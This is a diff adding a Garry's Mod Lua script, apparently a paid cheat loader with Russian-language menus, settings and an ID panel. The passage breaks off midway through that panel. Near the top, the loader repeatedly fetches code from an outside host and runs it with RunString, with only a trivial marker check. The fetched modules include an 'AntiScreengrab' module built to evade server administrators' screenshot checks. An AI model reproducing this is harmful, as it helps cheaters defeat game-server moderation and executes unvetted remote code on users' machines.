@@ -1,0 +1,2701 @@
+--14.03
+local counttterr = 0
+pcall ( function () function errorfolenorik(arg, arg2)
+MsgC(Color( 141, 197, 113 ), "\n\n-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n")
+MsgC( Color( 0, 144, 255 ), "[LoaderBetaLib] ", Color( 255, 74, 74 ), "Warning!! Code run Error\n")
+if arg != nil then print(arg) else print(" - No arguments") end
+if arg2 != nil then print("-----") print("More info: "..arg2) end
+MsgC( Color( 0, 144, 255 ), "[LoaderBetaLib] ", Color( 255, 74, 74 ), "Fast fix it")
+MsgC(Color( 141, 197, 113 ), "\n-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n")
+
+
+if counttterr >= 3 then 
+MsgC( Color( 0, 144, 255 ), "\n\n[LoaderBetaLib] ", Color( 255, 74, 74 ), "ЭКСТРЕННОЕ ОТКЛЮЧЕНИЕ ОТ СЕРВЕРА (3+ ОШИБКИ)\n\n")
+RunConsoleCommand("disconnect") 
+end
+
+counttterr = counttterr + 1
+
+timer.Create (  "counttttimeddsijrv" , 1 , 1 , function ( ) 
+counttterr = 0
+end)
+
+end end)
+
+
+pcall ( function () function checkssun(body, argur)
+if not body or string.find(body, '<html>') or string.find(body, '<head>') or string.find(body, '<script>') or body == "" or !string.find(body, '--popka') then
+errorfolenorik("R417", argur)
+return false
+else
+return true
+end
+end end)
+
+
+if !errorfolenorik or !checkssun then print("no") return end local succ, err =  pcall ( function ()
+
+local ply = LocalPlayer()
+modulaseijs = false
+modulaseijsspeclist = false
+--antisgpnstatusirmg = false
+
+if onloaderstartinexec then
+hook.Remove("Think","checkcodeerrorloader")
+end
+
+if yukgemiefjeurgjrehjf then MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "Loader УЖЕ БЫЛ ЗАПУЩЕН\n") return end
+yukgemiefjeurgjrehjf = true
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 75, 255, 135 ), "Loader is started\n\n")
+
+if !ba then MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "МЫ НЕ НА ЮРФЕ. ЗАПУСК ОТМЕНЁН\n") return end -- проверка на наличие badmin
+fewyujnnmelgiujkhr = false
+
+
+
+local function checkloadantisgnoti()
+if !antisgpnstatusirmg then
+
+http.Fetch( "https://hl2rpclassic.fun/gmodfun/cod/modularesung/moduleantisgjoise.txt",
+	
+	-- onSuccess function
+	function( body, length, headers, code )
+		-- The first argument is the HTML we asked for.
+		if code == 404 then
+--print("КОД ОШИБКИ: E3481 \nНЕМЕДЛЕННО ОТПИШИТЕ ЧЕЛОВЕКУ У КОТОРОГО ПОКУПАЛИ")
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ), "НЕ УДАЛОСЬ ЗАПУСТИТЬ МОДУЛЬ ANTISCREENGRAB. ОШИБКА A7412", "\n\n")
+--RunConsoleCommand("disconnectfalse")
+else
+		
+		local coderunloski = body
+//print(coderunloski)
+		
+		if coderunloski == "" then
+
+		else
+		//print(runcodegmod)
+		
+		if checkssun(coderunloski, "R41544") then -- проверка ссылки
+		RunString(coderunloski) else return
+		end
+		
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 75, 255, 135 ), "Start module AntiSG\n\n")
+modulaseijs = true
+		end
+		end
+	end,
+
+	-- onFailure function
+	function( message )
+		-- We failed. =(
+		--print("КОД ОШИБКИ: E8814 \nНЕМЕДЛЕННО ОТПИШИТЕ ЧЕЛОВЕКУ У КОТОРОГО ПОКУПАЛИ")
+		MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ), "НЕ УДАЛОСЬ ЗАПУСТИТЬ МОДУЛЬ ANTISCREENGRAB. ОШИБКА A1426", "\n\n")
+		--RunConsoleCommand("disconnectfalse")
+	end)
+
+
+elseif antisgpnstatusirmg then
+if !modulaseijs then
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 75, 255, 135 ), "Start module AntiSG\n\n")
+modulaseijs = true
+end
+end
+end
+
+
+local function checkspeclistload()
+if !speclistcfgloadfinish then
+
+http.Fetch( "https://hl2rpclassic.fun/gmodfun/cod/modularesung/modulespeclistisme9ifgr.txt",
+	
+	-- onSuccess function
+	function( body, length, headers, code )
+		-- The first argument is the HTML we asked for.
+		if code == 404 then
+--print("КОД ОШИБКИ: E3481 \nНЕМЕДЛЕННО ОТПИШИТЕ ЧЕЛОВЕКУ У КОТОРОГО ПОКУПАЛИ")
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ), "НЕ УДАЛОСЬ ЗАПУСТИТЬ МОДУЛЬ SPECTATE LIST. ОШИБКА S7412", "\n \n")
+--RunConsoleCommand("disconnectfalse")
+else
+		
+		local speclistcode = body
+//print(speclistcode)
+		
+		if speclistcode == "" then
+
+		else
+		//print(speclistcode)
+		--RunString(speclistcode)
+
+		if checkssun(speclistcode, "R41144") then -- проверка ссылки
+		RunString(speclistcode) else return
+		end
+
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 75, 255, 135 ), "Start module SpecList\n\n")
+modulaseijsspeclist = true
+		end
+		end
+	end,
+
+	-- onFailure function
+	function( message )
+		-- We failed. =(
+		--print("КОД ОШИБКИ: E8814 \nНЕМЕДЛЕННО ОТПИШИТЕ ЧЕЛОВЕКУ У КОТОРОГО ПОКУПАЛИ")
+		MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 255, 74, 74 ), "НЕ УДАЛОСЬ ЗАПУСТИТЬ МОДУЛЬ SPECTATE LIST. ОШИБКА S1426", "\n \n")
+		--RunConsoleCommand("disconnectfalse")
+	end)
+
+
+elseif speclistcfgloadfinish then
+if !modulaseijsspeclist then
+MsgC( Color( 0, 144, 255 ), "[LoaderBeta] ", Color( 75, 255, 135 ), "Start module SpecList\n\n")
+modulaseijsspeclist = true
+end
+end
+end
+
+
+/*
+if yukgemiefjeurgjrehjf then MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 255, 74, 74 ), "Loader УЖЕ БЫЛ ЗАПУЩЕН\n") return end
+yukgemiefjeurgjrehjf = true
+MsgC( Color( 0, 144, 255 ), "\n[LoaderBeta] ", Color( 75, 255, 135 ), "Loader is started\n")
+*/
+
+timer.Create (  "checkantisgmodule" , 10 , 0 , checkloadantisgnoti)
+checkloadantisgnoti()
+
+timer.Create (  "checkspeclistmodule" , 10 , 0 , checkspeclistload)
+checkspeclistload()
+
+
+local ply = LocalPlayer()
+local versionloaders = "19.12"
+
+
+
+surface.CreateFont("loadercheark", {
+size = 15, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("cheatttlogo", {
+size = 20, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Comic Sans MS"
+})
+
+--Boring Lesson
+
+surface.CreateFont("tekstvvike", {
+size = 17, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("textnamess", {
+size = 16, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("buttonchange", {
+size = 13, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("textloadersbut", {
+size = 22, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+--changelogmenu
+surface.CreateFont("spectatttt", {
+size = ScrW() * 0.02, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("myidfont", {
+size = 19, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("inventttsssloader", {
+size = 18, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Montserrat"
+})
+
+surface.CreateFont("textvbitocjnirgrgf", {
+size = 26, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Montserrat"
+})
+
+surface.CreateFont("dtextentryfonnts", {
+size = 15, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+surface.CreateFont("diskfont", {
+size = 22, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Montserrat"
+})
+
+
+surface.CreateFont("screenkaptuijde", {
+size = ScrW() * 0.02, 
+weight = 700, 
+antialias = true, 
+extended = true, 
+italic = false, 
+font = "Default"
+})
+
+
+function getfontfe(arg)
+local fontsrift = {}
+--print(arg)
+
+fontsrift[1] = "loadercheark";
+fontsrift[2] = "cheatttlogo";
+fontsrift[3] = "tekstvvike";
+fontsrift[4] = "textnamess";
+fontsrift[5] = "buttonchange";
+fontsrift[6] = "textloadersbut";
+fontsrift[7] = "spectatttt";
+fontsrift[8] = "myidfont";
+fontsrift[9] = "inventttsssloader";
+fontsrift[10] = "textvbitocjnirgrgf";
+fontsrift[11] = "dtextentryfonnts";
+fontsrift[12] = "diskfont";
+fontsrift[13] = "screenkaptuijde";
+
+
+
+if fontsrift[arg] == nil then
+errorfolenorik("Font Error", ""..arg.."")
+RunConsoleCommand("disconnect")
+return
+end
+
+return fontsrift[arg]
+end
+
+
+
+
+
+--local getcolormixer(3, 190) = Color( 190, 190, 190, 255 )	
+--local getcolormixer(3, 190) = Color( 215, 215, 215, 190 )
+--local getcolormixer(3, 255) = Color( 215, 215, 215, 255 )
+local convarmatfon = CreateClientConVar( "s.loader.matloader", 0, true, false )
+
+local debugon = 	0
+
+
+
+
+local buttonclose = 0
+
+
+local colortextsubs = Color(0, 200, 0)
+
+keybindsettingloader = KEY_P
+
+
+
+function loadloader()
+local convarbindmenus1 = CreateClientConVar( "loader_menubindnumber", 72, true, false ) -- бинд меню
+
+
+testpansss = vgui.Create("DFrame") -- главное окно
+
+--gavteeesk = testpansss:Add( "DPanel" ) -- панель главного меню
+gavteeesk1 = testpansss:Add( "DPanel" ) -- панель главного меню
+local mattest = vgui.Create("Material", gavteeesk1)
+gavteeesk = vgui.Create( "DPanel", gavteeesk1 )
+local twxxxx = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+local buttonreload = vgui.Create("DButton", testpansss) -- кнопка обновить список
+local buttonsettings = vgui.Create("DButton", testpansss) -- кнопка настройки
+loaderss = gavteeesk1:Add( "DPanel" ) -- панель загрузки
+local textloaderscr = vgui.Create( "DLabel", loaderss ) -- текст в загрузке
+local panelsetting = testpansss:Add( "DPanel" ) -- панель настройки
+local buttonbacksetting = vgui.Create("DButton", panelsetting) -- кнопка назад настройки
+local textsetting1 = vgui.Create( "DLabel", panelsetting ) -- текст НАСТРОЙКИ
+local keybindmenu = vgui.Create( "DBinder", panelsetting ) -- бинд меню
+local buttonresetcolorss = vgui.Create("DButton", panelsetting) -- кнопка сброса цвета
+--420 520
+unikidbutton = vgui.Create("DButton", testpansss) -- кнопка мой айди
+local panelunikid = testpansss:Add( "DPanel" ) -- панель айдишника
+local buttonnazad = vgui.Create("DButton", panelunikid) -- кнопка назад мой айди
+local textmyid = vgui.Create( "DLabel", panelunikid ) -- текст в мой айди
+local textmyidud = vgui.Create( "DLabel", panelunikid ) -- текст id
+local textmyidsteam = vgui.Create( "DLabel", panelunikid ) -- текст steamid
+local textmyidsteam64 = vgui.Create( "DLabel", panelunikid ) -- текст steamid64
+local copybutton = vgui.Create("DButton", panelunikid) -- кнопка скопировать id
+
+
+local nameskipbody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+local podpiskabody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+local textobnovbody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+local autozapiskbody = vgui.Create( "DLabel", gavteeesk ) -- текст в главном меню
+
+timer.Destroy("loadermenusss")
+timer.Destroy("textmenuloadersss")
+timer.Destroy("loadermenusss111")
+timer.Destroy("loadermenusss222")
+timer.Destroy("loadermenusss333")
+
+function closeallpanelsimeuk()
+gavteeesk:SetVisible( false );
+loaderss:SetVisible( false );
+panelsetting:SetVisible( false );
+panelunikid:SetVisible( false );
+
+
+
+
+
+if agitkamenu then panelframeopenagit:SetVisible( false ) agitkamenu = false end
+if fasthealmenu then panelframeopenheal:SetVisible( false ) fasthealmenu = false end
+if diskmenu then diskmenuus:SetVisible( false ) diskmenu = false end
+if fpsmenuboostload then fpsmenuboostloadss:SetVisible( false ) fpsmenuboostload = false end
+if tfafixload then tfafixmodulepant:SetVisible( false ) tfafixload = false end
+end
+
+
+local DScrollPanel = vgui.Create( "DScrollPanel", gavteeesk )
+--DScrollPanel:Dock( TOP )
+DScrollPanel:SetPos( 0, 105 ) 
+DScrollPanel:SetSize(510, 80)
+DScrollPanel:SetHeight( 365 )
+--DScrollPanel.Paint = function(self, w, h)
+--surface.SetDrawColor( 255, 0, 0, 128 ) -- красный цвет
+--surface.DrawLine( 12, 87, 407, 87 ) -- дополнительная полоса под кнопками
+--end
+
+
+local testpansgbuhu = DScrollPanel:Add( "DPanel" ) -- панель главного меню
+--полоски
+testpansgbuhu:Dock( TOP ) -- Dock it
+testpansgbuhu:SetHeight( 350 ) -- Set height
+
+local numbersch = 0
+
+
+
+
+
+---ВЫБОР ЦВЕТА
+
+
+--local convarantisgstatus1 = CreateClientConVar( "s.loader.test", 1, true, false )
+
+
+
+
+local convarcolorchanges = CreateClientConVar( "s.loader.colorchanges", 1, true, false )
+
+
+---convar цвета
+
+local convarco11 = CreateClientConVar( "s.loader.colorchanges.11", 255, true, false )
+local convarco12 = CreateClientConVar( "s.loader.colorchanges.12", 0, true, false )
+local convarco13 = CreateClientConVar( "s.loader.colorchanges.13", 0, true, false )
+
+local convarco21 = CreateClientConVar( "s.loader.colorchanges.21", 103, true, false )
+local convarco22 = CreateClientConVar( "s.loader.colorchanges.22", 200, true, false )
+local convarco23 = CreateClientConVar( "s.loader.colorchanges.23", 90, true, false )
+
+local convarco31 = CreateClientConVar( "s.loader.colorchanges.31", 215, true, false )
+local convarco32 = CreateClientConVar( "s.loader.colorchanges.32", 215, true, false )
+local convarco33 = CreateClientConVar( "s.loader.colorchanges.33", 215, true, false )
+
+local convarco41 = CreateClientConVar( "s.loader.colorchanges.41", 0, true, false )
+local convarco42 = CreateClientConVar( "s.loader.colorchanges.42", 0, true, false )
+local convarco43 = CreateClientConVar( "s.loader.colorchanges.43", 0, true, false )
+
+local convarco51 = CreateClientConVar( "s.loader.colorchanges.51", 200, true, false )
+local convarco52 = CreateClientConVar( "s.loader.colorchanges.52", 200, true, false )
+local convarco53 = CreateClientConVar( "s.loader.colorchanges.53", 0, true, false )
+
+local convarco61 = CreateClientConVar( "s.loader.colorchanges.61", 103, true, false )
+local convarco62 = CreateClientConVar( "s.loader.colorchanges.62", 200, true, false )
+local convarco63 = CreateClientConVar( "s.loader.colorchanges.63", 90, true, false )
+
+---convar цвета
+
+
+
+
+RunConsoleCommand("s.loader.colorchanges", 1)
+
+function getcolormixer(numb, alpha)
+if numb == 1 then
+return Color(convarco11:GetInt(),convarco12:GetInt(),convarco13:GetInt(), alpha)
+elseif numb == 2 then
+return Color(convarco21:GetInt(),convarco22:GetInt(),convarco23:GetInt(), alpha)
+elseif numb == 3 then
+return Color(convarco31:GetInt(),convarco32:GetInt(),convarco33:GetInt(), alpha)
+elseif numb == 4 then
+return Color(convarco41:GetInt(),convarco42:GetInt(),convarco43:GetInt(), alpha)
+elseif numb == 5 then
+return Color(convarco51:GetInt(),convarco52:GetInt(),convarco53:GetInt(), alpha)
+elseif numb == 6 then
+return Color(convarco61:GetInt(),convarco62:GetInt(),convarco63:GetInt(), alpha)
+end
+end
+
+
+
+local function updatecolortextodime()
+nameskipbody:SetColor(getcolormixer(2, 255))
+podpiskabody:SetColor(getcolormixer(2, 255))
+textobnovbody:SetColor(getcolormixer(2, 255))
+autozapiskbody:SetColor(getcolormixer(2, 255))
+end
+
+
+
+local function enablecolor(red, green, blue)
+if convarcolorchanges:GetInt() == 1 then
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
+elseif convarcolorchanges:GetInt() == 2 then
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
+updatecolortextodime()
+elseif convarcolorchanges:GetInt() == 3 then
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
+elseif convarcolorchanges:GetInt() == 4 then
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
+elseif convarcolorchanges:GetInt() == 5 then
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
+elseif convarcolorchanges:GetInt() == 6 then
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."1", red)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."2", green)
+RunConsoleCommand("s.loader.colorchanges."..convarcolorchanges:GetInt().."3", blue)
+end
+end
+
+
+
+
+local Mixer = vgui.Create("DColorMixer", panelsetting)
+--Mixer:Dock(FILL)					-- Make Mixer fill place of Frame
+Mixer:SetSize(185, 110)
+Mixer:SetPos(25, 130)
+Mixer:SetPalette(false)  			
+Mixer:SetAlphaBar(false) 			
+Mixer:SetWangs(true) 				
+Mixer:SetColor(getcolormixer(1)) 	
+
+
+Mixer.ValueChanged = function(testt)
+enablecolor(Mixer:GetColor().r, Mixer:GetColor().g, Mixer:GetColor().b)
+end 
+
+
+
+
+
+local colorchanges = ui.Create( "DComboBox", panelsetting )
+colorchanges:SetPos( 161, 200 )
+colorchanges:SetSize( 75, 40 )
+colorchanges:SetColor( getcolormixer(3, 200) )
+colorchanges:SetFont(getfontfe(3))
+colorchanges:SetValue( "Цвет 1" )
+colorchanges:AddChoice( "Цвет 1" )
+colorchanges:AddChoice( "Цвет 2" )
+colorchanges:AddChoice( "Цвет 3" )
+colorchanges:AddChoice( "Цвет 4" )
+colorchanges:AddChoice( "Цвет 5" )
+colorchanges:AddChoice( "Цвет 6" )
+colorchanges.OnSelect = function( self, index, value )
+RunConsoleCommand("s.loader.colorchanges", index)
+
+Mixer:SetColor(getcolormixer(index))
+
+/*
+if index == 1 then
+Mixer:SetColor(getcolormixer(1))
+elseif index == 2 then
+Mixer:SetColor(getcolormixer(2))
+elseif index == 3 then
+Mixer:SetColor(getcolormixer(3))
+elseif index == 4 then
+Mixer:SetColor(getcolormixer(4))
+end
+*/
+
+
+end
+
+
+/*
+if convarcolorchanges:GetInt() == 1 then
+chifekofe = true
+colorchanges:SetValue( "Уведомления AntiSG: Выкл." )
+colorchanges:SetColor( getcolormixer(3, 200) )
+colorchanges.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(202, 99, 99, 200), false, false, false, false )
+end
+elseif convarcolorchanges:GetInt() == 2 then
+chifekofe = false
+colorchanges:SetValue( "Уведомления AntiSG: Вкл." )
+colorchanges:SetColor( Color(0, 0, 0, 200) )
+colorchanges.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(99, 202, 99, 200), false, false, false, false )
+end
+else
+chifekofe = true
+colorchanges:SetValue( "Уведомления AntiSG: Выкл." )
+colorchanges:SetColor( getcolormixer(3, 200) )
+colorchanges.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, Color(202, 99, 99, 200), false, false, false, false )
+end
+end
+*/
+
+concommand.Add("resetcolor", function()
+RunConsoleCommand("s.loader.colorchanges.11", 255)
+RunConsoleCommand("s.loader.colorchanges.12", 0)
+RunConsoleCommand("s.loader.colorchanges.13", 0)
+
+RunConsoleCommand("s.loader.colorchanges.21", 103)
+RunConsoleCommand("s.loader.colorchanges.22", 200)
+RunConsoleCommand("s.loader.colorchanges.23", 90)
+
+RunConsoleCommand("s.loader.colorchanges.31", 215)
+RunConsoleCommand("s.loader.colorchanges.32", 215)
+RunConsoleCommand("s.loader.colorchanges.33", 215)
+
+RunConsoleCommand("s.loader.colorchanges.41", 0)
+RunConsoleCommand("s.loader.colorchanges.42", 0)
+RunConsoleCommand("s.loader.colorchanges.43", 0)
+updatecolortextodime()
+
+RunConsoleCommand("s.loader.colorchanges.51", 200)
+RunConsoleCommand("s.loader.colorchanges.52", 200)
+RunConsoleCommand("s.loader.colorchanges.53", 0)
+
+RunConsoleCommand("s.loader.colorchanges.61", 103)
+RunConsoleCommand("s.loader.colorchanges.62", 200)
+RunConsoleCommand("s.loader.colorchanges.63", 90)
+end)
+------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+--полосы между функциями
+testpansgbuhu.Paint = function(self, w, h)
+colorsss1 = 8
+colorsss2 = 442
+pos2 = 37
+
+surface.SetDrawColor( 180, 25, 30, 128 ) -- красный цвет
+
+for i = 1,numbersch do
+--for i = 1,7 do
+surface.DrawLine( colorsss1, pos2 + 0, colorsss2, pos2 + 0 ) -- дополнительная полоса под кнопками
+surface.DrawLine( colorsss1, pos2 + 1, colorsss2, pos2 + 1 ) -- дополнительная полоса под кнопками
+surface.DrawLine( colorsss1, pos2 + 2, colorsss2, pos2 + 2 ) -- дополнительная полоса под кнопками
+pos2 = pos2 + 47
+end
+end
+--длинна панели с полосами
+testpansgbuhu:SetHeight( 50 * numbersch + 50 )
+
+
+
+--Бинд на меню
+keybindmenu:SetSize( 165, 40 )
+keybindmenu:SetPos( 25, 75 )
+keybindmenu:SetValue( 18 )
+keybindmenu:SetFont(getfontfe(9))
+
+
+
+
+
+-----Спектейтлист
+local convarspecliststatus = CreateClientConVar( "s.loader.speclist", 1, true, false )
+local speclistcustom = ui.Create( "DComboBox", panelsetting )
+speclistcustom:SetPos( 220, 70 )
+speclistcustom:SetSize( 235, 20 )
+speclistcustom:SetColor( getcolormixer(3, 200) )
+speclistcustom:SetFont(getfontfe(3))
+speclistcustom:SetValue( "Spectate List: Выкл." )
+speclistcustom:AddChoice( "Spectate List: Выкл." )
+speclistcustom:AddChoice( "Spectate List: Вкл." )
+
+
+local function speclistcutomon()
+speclistcustomstatus = false
+speclistcustom:SetValue( "Spectate List: Вкл." )
+speclistcustom:SetColor( getcolormixer(4, 200) )
+speclistcustom.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(2, 180), false, false, false, false )
+end
+end
+
+local function speclistcutomoff()
+speclistcustomstatus = true
+speclistcustom:SetValue( "Spectate List: Выкл." )
+speclistcustom:SetColor( getcolormixer(3, 200) )
+speclistcustom.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(1, 105), false, false, false, false )
+end
+end
+
+
+speclistcustom.OnSelect = function( self, index, value )
+RunConsoleCommand("s.loader.speclist", index)
+if index == 1 then
+speclistcutomoff()
+elseif index == 2 then
+speclistcutomon()
+end
+end
+
+if convarspecliststatus:GetInt() == 2 then
+speclistcutomon()
+else
+speclistcutomoff()
+end
+
+
+
+
+-------АнтиСкрингабб
+local convarantisgstatus = CreateClientConVar( "s.loader.antisg", 1, true, false )
+local antisgcustomstatus = ui.Create( "DComboBox", panelsetting )
+antisgcustomstatus:SetPos( 220, 100 )
+antisgcustomstatus:SetSize( 235, 20 )
+antisgcustomstatus:SetColor( getcolormixer(3, 200) )
+antisgcustomstatus:SetFont(getfontfe(3))
+antisgcustomstatus:SetValue( "Уведомления AntiSG: Выкл." )
+antisgcustomstatus:AddChoice( "Уведомления AntiSG: Выкл." )
+antisgcustomstatus:AddChoice( "Уведомления AntiSG: Вкл." )
+
+
+local function anitsgcutomon()
+antisgcustomnpoti = false
+antisgcustomstatus:SetValue( "Уведомления AntiSG: Вкл." )
+antisgcustomstatus:SetColor( getcolormixer(4, 200) )
+antisgcustomstatus.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(2, 180), false, false, false, false )
+end
+end
+
+local function anitsgcutomoff()
+antisgcustomnpoti = true
+antisgcustomstatus:SetValue( "Уведомления AntiSG: Выкл." )
+antisgcustomstatus:SetColor( getcolormixer(3, 200) )
+antisgcustomstatus.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(1, 105), false, false, false, false )
+end
+end
+
+
+
+antisgcustomstatus.OnSelect = function( self, index, value )
+RunConsoleCommand("s.loader.antisg", index)
+
+if index == 1 then
+anitsgcutomoff()
+elseif index == 2 then
+anitsgcutomon()
+end
+
+
+end
+
+if convarantisgstatus:GetInt() == 2 then
+anitsgcutomon()
+else
+anitsgcutomoff()
+end
+
+
+
+
+
+
+---Материал
+mattest:SetPos(8, 0)
+mattest:SetSize(494, 478)
+mattest:SetMaterial("models/props_lab/cornerunit_cloud")
+mattest.AutoSize = false
+mattest:SetVisible( false );
+--models/props_lab/xencrystal_sheet
+
+concommand.Add("resetmat", function()
+mattest:SetMaterial("models/props_lab/cornerunit_cloud")
+mattest:SetVisible( false );
+end)
+
+
+
+---Вкл.выкл материал
+--local convarmatfon = CreateClientConVar( "s.loader.matloader", 0, true, false )
+local textmatpole = ui.Create( "DTextEntry", panelsetting ) -- поле
+local textmatpoleconvar = CreateClientConVar( "s.loader.mattextconvar", "models/props_lab/cornerunit_cloud", true, false ) --convar pole
+local backgroundfon = ui.Create( "DComboBox", panelsetting )
+backgroundfon:SetPos( 220, 130 )
+backgroundfon:SetSize( 235, 20 )
+backgroundfon:SetColor( getcolormixer(3, 200) )
+backgroundfon:SetFont(getfontfe(3))
+backgroundfon:SetValue( "Задний фон: Выкл." )
+backgroundfon:AddChoice( "Задний фон: Выкл." )
+backgroundfon:AddChoice( "Задний фон: Вкл." )
+
+
+local function backgrounddon()
+if textmatpoleconvar:GetString() == "" then mattest:SetVisible( false ) else
+mattest:SetVisible( true )
+mattest:SetMaterial(textmatpoleconvar:GetString())
+--print(textmatpoleconvar:GetString())
+end
+backgroundstatusfon = true
+backgroundfon:SetValue( "Задний фон: Вкл." )
+backgroundfon:SetColor( getcolormixer(4, 200) )
+backgroundfon.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(2, 180), false, false, false, false )
+end
+end
+
+local function backgrounddoff()
+mattest:SetVisible( false )
+mattest:SetMaterial("Models/effects/comball_sphere")
+backgroundstatusfon = false
+backgroundfon:SetValue( "Задний фон: Выкл." )
+backgroundfon:SetColor( getcolormixer(3, 200) )
+backgroundfon.Paint = function( self, w, h)
+draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(1, 105), false, false, false, false )
+end
+end
+
+
+
+backgroundfon.OnSelect = function( self, index, value )
+RunConsoleCommand("s.loader.matloader", index)
+
+if index == 1 then
+backgrounddoff()
+elseif index == 2 then
+backgrounddon()
+end
+
+
+end
+
+
+
+if convarmatfon:GetInt() == 2 then
+backgrounddon()
+else
+backgrounddoff()
+end
+
+
+
+
+---Поле ввода с материалом
+--local textmatpole = ui.Create( "DTextEntry", panelsetting )
+--local textmatpoleconvar = CreateClientConVar( "s.loader.mattextconvar", "", true, false )
+textmatpole:SetSize( 235, 25 )
+textmatpole:SetPos(220, 160)
+textmatpole:SetFont( getfontfe(5) )
+textmatpole:SetPlaceholderText( "Введите SteamID получателя" )
+textmatpole:SetValue( textmatpoleconvar:GetString() )
+textmatpole.OnEnter = function( self )
+--chat.AddText( textmatpole:GetValue() )
+end
+textmatpole.OnChange = function( self, stringValue )
+RunConsoleCommand("s.loader.mattextconvar", textmatpole:GetValue())
+--print(textmatpole:GetValue())
+if textmatpole:GetValue() == "" then
+mattest:SetVisible( false )
+else
+if backgroundstatusfon then
+mattest:SetVisible( true )
+end
+mattest:SetMaterial(textmatpole:GetValue())
+end
+end
+
+
+
+--Текст НАСТРОЙКИ
+textsetting1:SetPos( 198, 16 ) 
+textsetting1:SetColor(getcolormixer(5, 255))
+textsetting1:SetFont(getfontfe(6))
+textsetting1:SetText("Настройки") 
+textsetting1:SizeToContents() 
+textsetting1:SetDark( 1 ) 
+textsetting1:SetVisible( true );
+
+
+
+local minyspaik = 40
+--Текст мой айди
+textmyid:SetPos( 72, 120 - minyspaik ) 
+textmyid:SetColor(Color(0, 200, 200))
+textmyid:SetFont(getfontfe(8))
+textmyid:SetText( "                           Внимание! \n  Ваш ID это уникальный номер который \n              нельзя говорить никому \n   кроме разработчикам данного софта." ) 
+textmyid:SizeToContents() 
+textmyid:SetDark( 1 ) 
+textmyid:SetVisible( true );
+
+
+--Текст айди
+local svernik = string.reverse( string.Right( ply:SteamID64(), 10 ) / 4)
+textmyidud:SetPos( 112, 230 - minyspaik ) 
+textmyidud:SetColor(Color(200, 150, 0))
